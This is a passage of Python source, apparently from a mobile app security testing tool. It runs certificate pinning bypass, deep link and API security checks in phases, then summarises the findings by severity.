        pinning_tester = CertificatePinningBypass(package_name)
        pinning_findings = pinning_tester.test_pinning_bypass()
        all_findings.extend(pinning_findings)

    # Phase 3: Deep link testing
    if app_scheme:
        deeplink_tester = DeepLinkTester(
            app_scheme=app_scheme,
            package_name=package_name
        )
        deeplink_findings = deeplink_tester.test_all_deeplink_vulns()
        all_findings.extend(deeplink_findings)

    # Phase 4: Mobile API testing
    if api_base_url:
        api_tester = MobileAPISecurityTester(api_base_url)
        api_findings = api_tester.test_all_api_security()
        all_findings.extend(api_findings)

    # Generate summary
    severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}

    for finding in all_findings:
        severity_counts[finding.severity.value] += 1

    return {
        'total_findings': len(all_findings),
        'severity_counts': severity_counts,
        'findings': [f.to_dict() for f in all_findings],
        'tested_components': {
            'apk_analysis': apk_path is not None,
            'pinning_bypass': package_name is not None,
            'deeplink_testing': app_scheme is not None,
            'api_testing': api_base_url is not None
        }
    }
